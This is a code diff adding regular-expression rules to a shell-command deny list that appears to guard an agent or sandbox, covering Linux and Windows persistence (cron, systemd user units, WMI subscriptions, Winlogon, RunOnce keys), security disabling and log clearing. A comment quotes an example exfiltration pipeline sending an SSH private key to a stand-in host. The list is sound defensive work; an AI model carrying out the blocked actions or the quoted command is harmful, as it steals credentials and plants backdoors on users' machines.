@@ -38,8 +38,15 @@ export const BLACK_SHELL = [
   { re: /\b(?:iptables\s+-F|ufw\s+disable|setenforce\s+0)\b/i, why: 'disables host firewall/SELinux' },
   { re: /(?:Set|Add)-MpPreference[^|]*-(?:Disable\w+|ExclusionPath)/i, why: 'disables/evades Microsoft Defender' },
   { re: /\|\s*crontab\b/i, why: 'installs a crontab (persistence)' },
+  // crontab installed directly from a file or stdin (`crontab job`, `crontab -`,
+  // `crontab -u bob job`) — the non-pipe sibling of the rule above. Read-only/edit
+  // forms (`crontab -l`, `-e`, `-r`) start with a dash and are excluded.
+  { re: /\bcrontab\b(?:\s+-u\s+\S+)?\s+(?:-(?=\s|$)|[^\s-]\S*)/i, why: 'installs a crontab from a file/stdin (persistence)' },
   { re: /(?:>>?|tee\b|\bcp\b|\bmv\b|\becho\b|install)[^|]*authorized_keys/i, why: 'writes an SSH backdoor (authorized_keys)' },
   { re: /(?:>>?|tee\b|\bcp\b|\bmv\b|\binstall\b|\becho\b)[^|]*[\\/]etc[\\/](?:cron|systemd|ld\.so\.preload|sudoers|rc\.local|init\.d|profile\.d)/i, why: 'writes a persistence/escalation file (cron/systemd/sudoers/ld.so.preload)' },
+  // user-scoped systemd unit (~/.config/systemd/user/…) — the unprivileged sibling
+  // of the /etc/systemd write above; no root needed, still boots with the session.
+  { re: /(?:>>?|\btee\b|\bcp\b|\bmv\b|\binstall\b|\becho\b)[^|]*[\\/]\.config[\\/]systemd[\\/]user[\\/]/i, why: 'writes a user systemd unit (persistence)' },
   { re: /(?:>>?|tee\b|\bcp\b|\bmv\b)[^|]*[\\/]\.(?:bashrc|bash_profile|bash_login|zshrc|zshenv|zprofile|profile|kshrc|cshrc)\b/i, why: 'writes a shell rc/profile (login persistence)' },
   // [^|]* then any number of intermediate pipeline stages (base64/gzip/xxd/…) then
   // a network sink — so `cat ~/.ssh/id_rsa | base64 | nc evil 80` is still caught,
@@ -97,7 +104,21 @@ export const BLACK_SHELL = [
   { re: /(?:Copy-Item|Move-Item|Set-Content|Add-Content|Out-File|New-Item|Tee-Object|\bcp\b|\bmv\b|>>?)[^|]*(?:GetFolderPath\(\s*['"]?Startup|[\\/]Startup[\\/])/i, why: 'writes to the Startup folder (persistence)' },
   { re: /\bschtasks(?:\.exe)?\b[^|]*\/create\b/i, why: 'creates a scheduled task (persistence)' },
   { re: /\bRegister-ScheduledTask\b/i, why: 'registers a scheduled task (persistence)' },
+  // a scheduled task by another name — Register-ScheduledJob registers a PowerShell
+  // job under Task Scheduler (Microsoft\Windows\PowerShell\ScheduledJobs).
+  { re: /\bRegister-ScheduledJob\b/i, why: 'registers a scheduled job (persistence)' },
   { re: /\bsc(?:\.exe)?\s+create\b|\bNew-Service\b/i, why: 'creates a service (persistence)' },
+  // direct registry service install — evades `sc create` / `New-Service`.
+  { re: /\breg(?:\.exe)?\s+add\b[^|]*\b(?:CurrentControlSet|ControlSet\d+)[\\/]+Services\b/i, why: 'registry service install (persistence)' },
+  // WMI permanent event subscription — fileless persistence: a filter + a
+  // CommandLine/ActiveScript consumer wired by a FilterToConsumerBinding. Scoped to
+  // instance-CREATING cmdlets (Set/New-*Instance), so reads/temporary events stay clean.
+  { re: /\b(?:Set-WmiInstance|New-CimInstance|Set-CimInstance)\b[^|]*\b(?:__EventFilter|CommandLineEventConsumer|ActiveScriptEventConsumer|__FilterToConsumerBinding)\b|\bwmic\b[^|]*\bsubscription\b[^|]*\bcreate\b/i, why: 'WMI event-subscription persistence' },
+  // Winlogon Userinit/Shell hijack — runs an attacker binary at every logon.
+  { re: /\b(?:reg(?:\.exe)?\s+add|New-ItemProperty|Set-ItemProperty)\b[^|]*\bWinlogon\b[^|]*\b(?:Userinit|Shell)\b/i, why: 'Winlogon Userinit/Shell hijack (persistence)' },
+  // RunOnce / RunServices / Policies-Explorer-Run autostart keys — the Run-key
+  // rule above stops at `Run\b`, so these siblings need their own write-verb match.
+  { re: /(?:New-ItemProperty|Set-ItemProperty|reg(?:\.exe)?\s+add)\b[^|]*(?:CurrentVersion[\\/]+(?:RunOnce|RunServices(?:Once)?)|Policies[\\/]+Explorer[\\/]+Run)\b/i, why: 'RunOnce/RunServices/Policies autostart persistence' },
   // --- security disable (more) ---
   { re: /\bsc(?:\.exe)?\s+(?:stop|delete|config)\s+(?:WinDefend|Sense|MsMpSvc|WdNisSvc)\b/i, why: 'stops Microsoft Defender service' },
   { re: /\bwevtutil\s+(?:cl|clear-log)\b|\bClear-EventLog\b|\bRemove-EventLog\b/i, why: 'clears Windows event logs (anti-forensics)' },
